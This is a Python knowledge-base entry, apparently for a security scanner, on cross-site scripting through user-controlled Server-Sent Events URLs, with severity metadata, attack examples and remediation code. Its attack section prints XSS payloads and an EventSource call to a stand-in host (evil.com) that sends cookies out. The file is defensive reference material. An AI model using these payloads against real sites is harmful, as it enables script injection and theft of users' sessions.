#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: SSE URL XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via SSE URL",
    "severity": "high",
    "cvss_score": 7.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-601"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "sse", "eventsource", "url", "redirect"],
    "description": """
SSE URL XSS occurs when user input controls the EventSource URL or when
SSE endpoint URLs are reflected in the page.

SEVERITY: HIGH
Attacker can redirect SSE to malicious server. URL parameters may contain XSS.
Connection errors often reflect the URL.
""",
    "attack_vector": """
USER-CONTROLLED URL:
const source = new EventSource(userInput);
// userInput: https://evil.com/events

URL PARAMETER XSS:
const source = new EventSource(`/events?user=${userInput}`);
// userInput: <script>alert(1)</script>
// Error reflects URL

PATH INJECTION:
const source = new EventSource(`/events/${userInput}`);
// userInput: ../../<script>alert(1)</script>

ERROR DISPLAY:
source.onerror = () => {
  div.innerHTML = `Failed to connect to ${source.url}`;
};

REDIRECT VIA SSE:
data: {"redirect": "javascript:alert(1)"}
// location.href = data.redirect;

QUERY STRING XSS:
/events?callback=<script>alert(1)</script>

WITHCREDENTIALS:
const source = new EventSource(userUrl, { withCredentials: true });
// Sends cookies to attacker
""",
    "remediation": """
DEFENSE:

1. HARDCODE EventSource URLs
2. Validate URL format strictly
3. Use allowlist for SSE hosts
4. Don't reflect URL in error messages
5. Validate origin on server

SAFE PATTERN:
// Hardcoded URL
const SSE_URL = '/api/events';
const source = new EventSource(SSE_URL);

// If dynamic:
function getSseUrl(channel) {
  const safe = encodeURIComponent(channel.replace(/[^a-z0-9]/gi, ''));
  return `/api/events/${safe}`;
}

ERROR HANDLING:
source.onerror = () => {
  div.textContent = 'Connection lost';  // Generic, safe
};

SERVER VALIDATION:
# Check Origin header
if request.headers.get('Origin') != 'https://example.com':
    abort(403)

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CWE-601: Open Redirect
""",
}
